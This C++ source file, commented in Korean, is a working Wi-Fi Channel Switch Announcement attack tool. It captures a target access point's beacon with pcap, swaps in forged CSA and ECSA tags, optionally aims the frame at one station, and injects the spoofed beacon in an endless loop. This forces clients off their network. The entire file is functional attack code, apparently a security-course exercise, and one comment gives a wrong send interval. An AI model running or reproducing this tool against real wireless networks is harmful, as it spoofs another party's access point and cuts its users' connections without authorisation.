#include "pch.h"
#include "dot11.h"
#include "radiotap.h"
#include "param.h"

#include <atomic>
#include <csignal>

// 전역 종료 플래그
static std::atomic<bool> g_running(true);
static void on_sigint(int) { g_running.store(false); }

// BEACON_FIXED_LEN: Dot11Hdr + BeaconHdr::Fix
static const size_t beaconFixedLen =
    sizeof(Dot11Hdr) + sizeof(BeaconHdr::Fix);

// ECSA/CSA 태그
BeaconHdr::CsaTag csa_ = {37, 3, 1, 11, 0};
BeaconHdr::EcsaTag ecsa_ = {60, 4, 1, 81, 11, 0};

// BeaconLayout: 캡처 프레임 구조 파싱 결과
#pragma pack(push, 1)
struct BeaconLayout {
    size_t rtLen;     // Radiotap 헤더 길이
    size_t dot11End;  // FCS 제외 프레임 끝 오프셋
    size_t tagsLen;   // 태그 영역 길이
};
#pragma pack(pop)

// 캡처된 버퍼에서 BeaconLayout을 채운다. 실패 시 false 반환.
static bool check_layout(const std::vector<uint8_t>& cap, BeaconLayout& layout) {
    // Radiotap 최소 크기 확인
    if (cap.size() < sizeof(RadioTapHdr)) return false;

    RadioTapHdr rt;
    memcpy(&rt, cap.data(), sizeof(RadioTapHdr));

    layout.rtLen = rt.get_len();
    if (layout.rtLen < sizeof(RadioTapHdr) || layout.rtLen > cap.size())
        return false;

    // FCS 4바이트가 붙어 있으면 제거한 끝 오프셋
    size_t fcsSize = rt.get_fcs();
    if (cap.size() < fcsSize) return false;
    layout.dot11End = cap.size() - fcsSize;

    // Dot11Hdr + Fix 최소 길이 확인
    if (layout.dot11End < layout.rtLen + beaconFixedLen) return false;

    layout.tagsLen = layout.dot11End - layout.rtLen - beaconFixedLen;
    return true;
}

// 태그 복사 + CSA(37)/ECSA(60) 교체 삽입
static void replace_csa(std::vector<uint8_t>& out, const uint8_t* tagBuf, size_t tagsLen) {
    // 1) 기존 태그 순회 — CSA(37) / ECSA(60) 는 제거
    size_t i = 0;
    while (i + 2 <= tagsLen) {
        uint8_t tagId = tagBuf[i];
        uint8_t tagLen = tagBuf[i + 1];

        if (i + 2 + tagLen > tagsLen) break;

        if (tagId != 37 && tagId != 60) {
            out.insert(out.end(), tagBuf + i, tagBuf + i + 2 + tagLen);
        }
        i += 2 + tagLen;
    }

    // 2) 새 CSA 태그 삽입
    uint8_t csaBuf[sizeof(csa_)];
    memcpy(csaBuf, &csa_, sizeof(csa_));
    out.insert(out.end(), csaBuf, csaBuf + sizeof(csa_));

    // 3) 새 ECSA 태그 삽입
    uint8_t ecsaBuf[sizeof(ecsa_)];
    memcpy(ecsaBuf, &ecsa_, sizeof(ecsa_));
    out.insert(out.end(), ecsaBuf, ecsaBuf + sizeof(ecsa_));
}

// build_csa_beacon: CSA/ECSA Beacon 프레임 조립
static std::vector<uint8_t> build_csa_beacon(const std::vector<uint8_t>& captured, bool useUnicast, const Mac& staMac) {
    BeaconLayout layout;
    if (!check_layout(captured, layout)) return {};

    const uint8_t* dot11Start = captured.data() + layout.rtLen;

    std::vector<uint8_t> out;
    out.reserve(sizeof(RadioTapHdr) + beaconFixedLen + layout.tagsLen + sizeof(BeaconHdr::CsaTag) + sizeof(BeaconHdr::EcsaTag));

    // 새 Radiotap 헤더
    RadioTapHdr txRt;
    txRt.init();
    uint8_t rtBuf[sizeof(RadioTapHdr)];
    memcpy(rtBuf, &txRt, sizeof(RadioTapHdr));
    out.insert(out.end(), rtBuf, rtBuf + sizeof(RadioTapHdr));

    // 원본 Dot11Hdr + BeaconHdr::Fix 복사
    out.insert(out.end(), dot11Start, dot11Start + beaconFixedLen);

    // 유니캐스트
    if (useUnicast) {
        Dot11Hdr dot11hdr;
        memcpy(&dot11hdr, out.data() + sizeof(RadioTapHdr), sizeof(Dot11Hdr));
        dot11hdr.addr1_ = staMac;
        memcpy(out.data() + sizeof(RadioTapHdr), &dot11hdr, sizeof(Dot11Hdr));
    }

    // 태그 복사 + CSA/ECSA 교체 삽입
    replace_csa(out, dot11Start + beaconFixedLen, layout.tagsLen);
    return out;
}

// pcap_next_ex 기반 단일 패킷 캡처
static bool capture_one(pcap_t* handle, std::vector<uint8_t>& outBuf) {
    while (g_running.load()) {
        pcap_pkthdr*   hdr = nullptr;
        const uint8_t* pkt = nullptr;
        int rc = pcap_next_ex(handle, &hdr, &pkt);
        if (rc == 0) continue;          // 타임아웃
        if (rc == PCAP_ERROR_BREAK) return false;
        if (rc < 0) {
            fprintf(stderr, "pcap_next_ex : %s\n", pcap_geterr(handle));
            return false;
        }
        outBuf.assign(pkt, pkt + hdr->caplen);
        return true;
    }
    return false;
}

// BPF 필터로 지정 AP의 Beacon 한 프레임 캡처
static bool capture_first_beacon(pcap_t* handle, std::vector<uint8_t>& outBeacon) {
    std::string filter_exp = "type mgt subtype beacon and wlan addr3 " + args_.apMac.toString();

    bpf_program fp;
    if (pcap_compile(handle, &fp, filter_exp.data(), 1, PCAP_NETMASK_UNKNOWN) < 0)
        return false;

    if (pcap_setfilter(handle, &fp) < 0) {
        pcap_freecode(&fp);
        return false;
    }
    pcap_freecode(&fp);

    return capture_one(handle, outBeacon);
}

int main(int argc, char* argv[]) {
    if (!parseArgs(argc, argv)) {
        usage(argv[0]);
        return 1;
    }

    pcap_t* handle = openHandle(args_.iface);
    if (!handle) return 1;

    // 시그널 핸들러 등록
    std::signal(SIGINT, on_sigint);
    std::signal(SIGTERM, on_sigint);

    printInfo();

    // Beacon 캡처
    std::vector<uint8_t> beaconBuf;
    if (!capture_first_beacon(handle, beaconBuf)) {
        pcap_close(handle);
        return 0;
    }
    printf("captured beacon : %zu bytes\n", beaconBuf.size());

    //  CSA Beacon 프레임 생성
    std::vector<uint8_t> outFrame =
        build_csa_beacon(beaconBuf, args_.hasStation, args_.staMac);
    if (outFrame.empty()) {
        fprintf(stderr, "CSA frame 생성 실패 \n");
        pcap_close(handle);
        return 1;
    }
    printf("built CSA/ECSA frame : %zu bytes\n", outFrame.size());
    printf("starting CSA attack\n");

    // 전송 루프
    uint8_t* const dot11Ptr   = outFrame.data() + sizeof(RadioTapHdr);
    uint16_t tx_seqCtrl = 0;
    uint64_t sent_ok = 0;

    while (g_running.load()) {
        // seq_ctrl 갱신 (중복 프레임 무시 방지)
        Dot11Hdr macHdr;
        memcpy(&macHdr, dot11Ptr, sizeof(Dot11Hdr));
        macHdr.seqCtrl_ = static_cast<uint16_t>((tx_seqCtrl++ & 0x0FFF) << 4);
        memcpy(dot11Ptr, &macHdr, sizeof(Dot11Hdr));

        if (pcap_sendpacket(handle, outFrame.data(), static_cast<int>(outFrame.size())) != 0) {
            fprintf(stderr, "pcap_sendpacket : %s\n", pcap_geterr(handle));
            break;
        }
        ++sent_ok;
        std::cout << "CSA sent : ok=" << sent_ok << " (" << outFrame.size() << " bytes)\n";

        usleep(10000);  // 100ms 간격
    }

    std::cout << "\n Attck total count =" << sent_ok << "\n";
    pcap_close(handle);
    return 0;
}
